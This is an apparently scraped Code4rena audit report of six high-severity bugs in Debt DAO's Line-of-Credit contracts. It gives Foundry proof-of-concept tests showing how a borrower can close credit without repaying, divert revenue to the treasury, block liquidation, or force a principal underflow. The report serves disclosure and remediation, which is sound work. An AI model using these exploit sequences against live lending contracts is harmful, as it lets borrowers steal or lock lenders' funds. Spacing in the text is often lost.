@@ -1,0 +1,105 @@
+[H-01] Call todeclareInsolvent()would revert when contract status reaches liquidation point after repayment of credit position 1
+Submitted bycryptphi, also found byadriro,Ch_301,PaludoX0,ayeslick, andperseverancesuccess
+https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/modules/credit/LineOfCredit.sol#L143
+https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/modules/credit/LineOfCredit.sol#L83-L86
+Impact
+The modifierwhileBorrowing()is used along in the call to LineOfCredit.declareInsolvent(). However this check reverts when count == 0 orcredits[ids[0]].principal == 0. Within the contract, any lender can add credit which adds an entry in credits array, credits[ids].
+Assume, when borrower chooses lender positions including credits[ids[0]] to draw on, and repays back the loan fully for credits[ids[1]], then the call to declareInsolvent() by the arbiter would revert since it does not pass thewhileBorrowing()modifier check due to the ids array index shift in the call to  stepQ(), which would shift ids[1] to ids[0], thereby making the condition forcredits[ids[0]].principal == 0be true causing the revert.
+Proof of Concept
+LineOfCredit contract is set up and 5 lenders have deposited into the contract.Alice, the borrower borrows credit from these 5 credit positions including by callingLineOfCredit.borrow()for the position ids.Later Alice pays back the loan for  credit position id 1 just before the contract gets liquidated.At the point whereids.stepQ()is called in\_repay(), position 1 is moved to ids[0]When contract status is LIQUIDATABLE, no loan drawn on credit position 0 and arbiter calls declareInsolvent() , the call would revert sincecredits[ids[0]].principal == 0
+Recommended Mitigation Steps
+The modifierwhileBorrowing()would need to be reviewed and amended.
+dmvt (judge) increased severity to High
+kibagateaux (Debt DAO) confirmed
+
+[H-02] Non-existing revenue contract can be passed to claimRevenue to send all tokens to treasury
+Submitted byLambda, also found byberndartmueller,adriro, andaphak5010
+NeitherSpigotLib.claimRevenuenorSpigotLib._claimRevenuecheck that the providedrevenueContractwas registered before. If this is not the case,SpigotLib._claimRevenueassumes that this is a revenue contract with push payments (becauseself.settings[revenueContract].claimFunctionis 0) and just returns the difference since the last call toclaimRevenue:
+if(self.settings[revenueContract].claimFunction==bytes4(0)) {// push payments// claimed = total balance - already accounted for balanceclaimed=existingBalance-self.escrowed[token];//@audit Rebasing tokens// underflow revert ensures we have more tokens than we started with and actually claimed revenue}
+SpigotLib.claimRevenuewill then readself.settings[revenueContract].ownerSplit, which is 0 for non-registered revenue contracts:
+uint256escrowedAmount=claimed*self.settings[revenueContract].ownerSplit/100;
+Therefore, the wholeclaimedamount is sent to the treasury.
+This becomes very problematic for revenue tokens that use push payments. An attacker (in practice the borrower) can just regularly callclaimRevenuewith this token and a non-existing revenue contract. All of the tokens that were sent to the spigot since the last call will be sent to the treasury and none to the escrow, i.e. a borrower can ensure that no revenue will be available for the lender, no matter what the configured split is.
+Proof Of Concept
+As mentioned above, the attack pattern works for arbitrary tokens where one (or more) revenue contracts use push payments, i.e. where the balance of the Spigot increases from time to time. Then, the attacker just callsclaimRevenuewith a non-existing address. This is illustrated in the following diff:
+--- a/contracts/tests/Spigot.t.sol+++ b/contracts/tests/Spigot.t.sol@@ -174,7 +174,7 @@ contract SpigotTest is Test {assertEq(token.balanceOf(address(spigot)), totalRevenue);bytes memory claimData;-        spigot.claimRevenue(revenueContract, address(token), claimData);+        spigot.claimRevenue(address(0), address(token), claimData);
+Thanks to this small modification, all of the tokens are sent to the treasury and none are sent to the escrow.
+Recommended Mitigation Steps
+Check that a revenue contract was registered before, revert if it does not.
+kibagateaux (Debt DAO) confirmed
+
+[H-03] addCredit / increaseCredit cannot be called by lender first when token is ETH
+Submitted byLambda, also found byberndartmueller,Trust,minhquanym,adriro, andHE1M
+https://github.com/debtdao/Line-of-Credit/blob/f32cb3eeb08663f2456bf6e2fba21e964da3e8ae/contracts/modules/credit/LineOfCredit.sol#L234
+https://github.com/debtdao/Line-of-Credit/blob/f32cb3eeb08663f2456bf6e2fba21e964da3e8ae/contracts/modules/credit/LineOfCredit.sol#L270
+Impact
+The functionsaddCreditandincreaseCreditboth ahve amutualConsentormutualConsentByIdmodifier. Furthermore, these functions arepayableand the lender needs to send the corresponding ETH with each call. However, if we look at the mutual consent modifier works, we can have a problem:
+modifiermutualConsent(address_signerOne,address_signerTwo) {if(_mutualConsent(_signerOne,_signerTwo))  {// Run whatever code needed 2/2 consent_;}}function_mutualConsent(address_signerOne,address_signerTwo)internalreturns(bool) {if(msg.sender!=_signerOne&&msg.sender!=_signerTwo) {revertUnauthorized(); }addressnonCaller=_getNonCaller(_signerOne,_signerTwo);// The consent hash is defined by the hash of the transaction call data and sender of msg,// which uniquely identifies the function, arguments, and sender.bytes32expectedHash=keccak256(abi.encodePacked(msg.data,nonCaller));if(!mutualConsents[expectedHash]) {bytes32newHash=keccak256(abi.encodePacked(msg.data,msg.sender));mutualConsents[newHash] =true;emitMutualConsentRegistered(newHash);returnfalse;}deletemutualConsents[expectedHash];returntrue;}
+The problem is: On the first call, when the other party has not given consent to the call yet, the modifier does not revert. It sets the consent of the calling party instead.
+This is very problematic in combination with sending ETH for two reasons:
+When the lender performs the calls first and sends ETH along with the call, the call will not revert. It will instead set the consent for him, but the sent ETH is lost.Even when the lender thinks about this and does not provide any ETH on the first call, the borrower has to perform the second call. Of course, he will not provide the ETH with this call, but this will cause the transaction to revert. There is now no way for the borrower to also grant consent, but still let the lender perform the call.
+Proof Of Concept
+Lender Alice callsLineOfCredit.addCreditfirst to add a credit with 1 ETH. She sends 1 ETH with the call. However, because borrower Bob has not performed this call yet, the function body is not executed, but the 1 ETH is still sent. Afterwards, Bob wants to give his consent, so he performs the same call. However, this call reverts, because Bob does not send any ETH with it.
+Recommended Mitigation Steps
+Consider implementing an external function to grant consent to avoid this scenario. Also consider reverting when ETH is sent along, but the other party has not given their consent yet.
+dmvt (judge) increased severity to High
+kibagateaux (Debt DAO) confirmed
+
+[H-04] Borrower can close a credit without repaying debt
+Submitted byJeiwan, also found byjoestakey,berndartmueller,smiling_heretic,adriro,hansfriese, andbin2chen
+A borrower can close a credit without repaying the debt to the lender. The lender will be left with a bad debt and the borrower will keep the borrowed amount and the collateral.
+Proof of Concept
+Theclosefunction ofLineOfCreditdoesn’t check whether a credit exists or not. As a result, thecountvariable is decreased in the internal_closefunction when theclosefunction is called with an non-existent credit ID:LineOfCredit.sol#L388:
+functionclose(bytes32id)externalpayableoverridereturns(bool) {Creditmemorycredit=credits[id];addressb=borrower;// gas savingsif(msg.sender!=credit.lender&&msg.sender!=b) {revertCallerAccessDenied();}// ensure all money owed is accounted for. Accrue facility fee since prinicpal was paid offcredit=_accrue(credit,id);uint256facilityFee=credit.interestAccrued;if(facilityFee>0) {// only allow repaying interest since they are skipping repayment queue.// If principal still owed, _close() MUST failLineLib.receiveTokenOrETH(credit.token,b,facilityFee);credit=_repay(credit,id,facilityFee);}_close(credit,id);// deleted; no need to save to storagereturntrue;}
+LineOfCredit.sol#L483:
+function_close(Creditmemorycredit,bytes32id)internalvirtualreturns(bool) {if(credit.principal>0) {revertCloseFailedWithPrincipal(); }// return the Lender's funds that are being repaidif(credit.deposit+credit.interestRepaid>0) {LineLib.sendOutTokenOrETH(credit.token,credit.lender,credit.deposit+credit.interestRepaid);}deletecredits[id];// gas refunds// remove from active listids.removePosition(id);unchecked{ --count; }// If all credit lines are closed the the overall Line of Credit facility is declared 'repaid'.if(count==0) {_updateStatus(LineLib.STATUS.REPAID); }emitCloseCreditPosition(id);returntrue;}
+Proof of Concept:
+// contracts/tests/LineOfCredit.t.solfunctiontestCloseWithoutRepaying_AUDIT()public{assertEq(supportedToken1.balanceOf(address(line)),0,"Line balance should be 0");assertEq(supportedToken1.balanceOf(lender),mintAmount,"Lender should have initial mint balance");_addCredit(address(supportedToken1),1ether);bytes32id=line.ids(0);assert(id!=bytes32(0));assertEq(supportedToken1.balanceOf(lender),mintAmount-1ether,"Lender should have initial balance less lent amount");hoax(borrower);line.borrow(id,1ether);assertEq(supportedToken1.balanceOf(borrower),mintAmount+1ether,"Borrower should have initial balance + loan");// The credit hasn't been repaid.// hoax(borrower);// line.depositAndRepay(1 ether);hoax(borrower);// Closing with a non-existent credit ID.line.close(bytes32(uint256(31337)));// The debt hasn't been repaid but the status is REPAID.assertEq(uint(line.status()),uint(LineLib.STATUS.REPAID));// Lender's balance is still reduced by the borrow amount.assertEq(supportedToken1.balanceOf(lender),mintAmount-1ether);// Borrower's balance still includes the borrowed amount.assertEq(supportedToken1.balanceOf(borrower),mintAmount+1ether);}
+Recommended Mitigation Steps
+In theclosefunction ofLineOfCredit, consider ensuring that a credit with the user-supplied ID exists, before closing it.
+kibagateaux (Debt DAO) confirmed
+
+[H-05] Borrower can craft a borrow that cannot be liquidated, even by arbiter.
+Submitted byTrust, also found bybin2chen
+LineOfCredit manages an array of open credit line identifiers calledids. Many interactions with the Line operate on ids[0], which is presumed to be the oldest borrow which has non zero principal. For example, borrowers must first deposit and repay to ids[0] before other credit lines.
+The list is managed by several functions:
+CreditListLib.removePosition - deletes parameter id in the ids arrayCreditListLib.stepQ - rotates all ids members one to the left, with the leftmost becoming the last element_sortIntoQ - most complex function, finds the smallest index which can swap identifiers with the parameter id, which satisfies the conditions:target index is not emptythere is no principal owed for the target index’s credit
+The idea I had is that if we could corrupt the ids array so that ids[0] would be zero, but after it there would be some other active borrows, it would be a very severe situation. The whileBorrowing() modifier assumes if the first element has no principal, borrower is not borrowing.
+modifier whileBorrowing() {if(count == 0 || credits[ids[0]].principal == 0) { revert NotBorrowing(); }_;}
+It turns out there is a simple sequence of calls which allows borrowing while ids[0] is deleted, and does not re-arrange the new borrow into ids[0]!
+id1 =addCredit()- add a new credit line, a new id is pushed to the end of ids array.id2 =addCredit()- called again, ids.length = 2close(id1) - callsremovePosition()on id1, now ids array is [0x000000000000000000000000, id2 ]borrow(id2) - will borrow from id2 and call\_sortIntoQ. The sorting loop will not find another index other than id2’s existing index (id == bytes32(0)is true).
+From this sequence, we achieve a borrow while ids[0] is 0! Therefore, credits[ids[0]].principal = credits[0].principal = 0, and whileBorrowing() reverts.
+The impact is massive - the following functions are disabled:
+SecureLine::liquidate()LineOfCredit::depositAndClose()LineOfCredit::depositAndRepay()LineOfCredit::claimAndRepay()LineOfCredit::claimAndTrade()
+Impact
+Borrower can craft a borrow that cannot be liquidated, even by arbiter. Alternatively, functionality may be completely impaired through no fault of users.
+Proof of Concept
+Copy the following code into LineOfCredit.t.sol
+function _addCreditLender2(address token, uint256 amount) public {// Prepare lender 2 operations, does same as mintAndApprove()address lender2 = address(21);deal(lender2, mintAmount);supportedToken1.mint(lender2, mintAmount);supportedToken2.mint(lender2, mintAmount);unsupportedToken.mint(lender2, mintAmount);vm.startPrank(lender2);supportedToken1.approve(address(line), MAX_INT);supportedToken2.approve(address(line), MAX_INT);unsupportedToken.approve(address(line), MAX_INT);vm.stopPrank();// addCredit logicvm.prank(borrower);line.addCredit(dRate, fRate, amount, token, lender2);vm.stopPrank();vm.prank(lender2);line.addCredit(dRate, fRate, amount, token, lender2);vm.stopPrank();}function test_attackUnliquidatable() public {bytes32 id_1;bytes32 id_2;_addCredit(address(supportedToken1), 1 ether);_addCreditLender2(address(supportedToken1), 1 ether);id_1 =  line.ids(0);id_2 =  line.ids(1);hoax(borrower);line.close(id_1);hoax(borrower);line.borrow(id_2, 1 ether);id_1 =  line.ids(0);id_2 = line.ids(1);console.log("id1 : ", uint256(id_1));console.log("id2 : ", uint256(id_2));vm.warp(ttl+1);assert(line.healthcheck() == LineLib.STATUS.LIQUIDATABLE);vm.expectRevert(ILineOfCredit.NotBorrowing.selector);bool isSolvent = line.declareInsolvent();}
+Recommended Mitigation Steps
+When sorting new borrows into the ids queue, do not skip any elements.
+dmvt (judge) marked as nullified
+Trust (warden) commented:
+Unclear why this issue is nullified, I have demonstrated a POC that shows line cannot be declared insolvent.
+dmvt (judge) re-opened the issue and commented:
+Kicking back to the sponsor for another look. I’m inclined to bring this one back as valid unless the sponsor can show why it isn’t.
+kibagateaux (Debt DAO) confirmed
+
+[H-06] Repaying a line of credit with a higher than necessary claimed revenue amount will force the borrower into liquidation
+Submitted byberndartmueller, also found byTrust,hansfriese,adriro,0xdeadbeef0x,aphak5010, andrvierdiiev
+A borrower can repay (parts) of a credit line with theSpigotedLine.useAndRepayfunction. This function will useamountofunusedTokens[credit.token]as a repayment. However, ifamountexceeds the principal and the accrued interest,credit.principalwill underflow without an error and set the principal value to a very large number.
+This a problem because a borrower can unknowingly provide a larger than necessaryamountto theSpigotedLine.useAndRepayfunction to make sure enough funds are used to fully repay the principal and the remaining interest.
+Additionally, a lender can do the same thing as the lender can call this function.
+Impact
+Thecredit.principalunderflows without an error and will be set to a very large number. This will force a secured lineimmediatelyinto liquidation. Additionally, having a principal value close to2^256 - 1will make it hugely expensive to repay the credit line.
+Proof of Concept
+utils/CreditLib.sol#L186
+functionrepay(ILineOfCredit.Creditmemorycredit,bytes32id,uint256amount)externalreturns(ILineOfCredit.Creditmemory){unchecked{if(amount<=credit.interestAccrued) {credit.interestAccrued-=amount;credit.interestRepaid+=amount;emitRepayInterest(id,amount);returncredit;}else{uint256interest=credit.interestAccrued;uint256principalPayment=amount-interest;// update individual credit line denominated in tokencredit.principal-=principalPayment;// @audit-info potential underflow without an error due to the unchecked blockcredit.interestRepaid+=interest;credit.interestAccrued=0;emitRepayInterest(id,interest);emitRepayPrincipal(id,principalPayment);returncredit;}} }
+To demonstrate the issue, copy the following test case and paste it into theSpigotedLine.t.soltest file. Then runforge test --match-test "test_lender_use_and_repay_underflow".
+Following scenario causes the repayment to underflow:
+Borrower borrows1 etherofrevenueToken2 etherworth ofrevenueTokenis claimed and traded from the revenue contractUse all of the previously claimed funds (2 ether) to repay the line of credit (=1 ether)credit.principalunderflows due toprincipalPaymentis larger thancredit.principal
+functiontest_lender_use_and_repay_underflow()public{uint256largeRevenueAmount=lentAmount*2;deal(address(lender),lentAmount+1ether);deal(address(revenueToken),MAX_REVENUE);addressrevenueC=address(0xbeef);// need new spigot for testingbytes32id=_createCredit(address(revenueToken),Denominations.ETH,revenueC);// 1. Borrow lentAmount = 1 ether_borrow(id,lentAmount);// 2. Claim and trade largeRevenueAmount = 2 ether (revenue)bytesmemorytradeData=abi.encodeWithSignature('trade(address,address,uint256,uint256)',address(revenueToken),Denominations.ETH,1gwei,largeRevenueAmount);hoax(borrower);line.claimAndTrade(address(revenueToken),tradeData);(,uint256principalBeforeRepaying,,,,,) =line.credits(line.ids(0));assertEq(principalBeforeRepaying,lentAmount);// 3. Use and repay debt with previously claimed and traded revenue (largeRevenueAmount = 2 ether)vm.prank(lender);line.useAndRepay(largeRevenueAmount);(,uint256_principal,,,,,) =line.credits(line.ids(0));uint256underflowedPrincipal=principalBeforeRepaying;unchecked{underflowedPrincipal-= (largeRevenueAmount);}// 4. Principal underflowedassertEq(_principal,underflowedPrincipal);}
+Recommended Mitigation Steps
+Consider assertingamountis less or equal thancredit.principal + credit.interestAccrued(require(amount <= credit.principal + credit.interestAccrued);). Similar as how it is done inLineOfCredit.depositAndRepay()
+kibagateaux (Debt DAO) confirmed
+
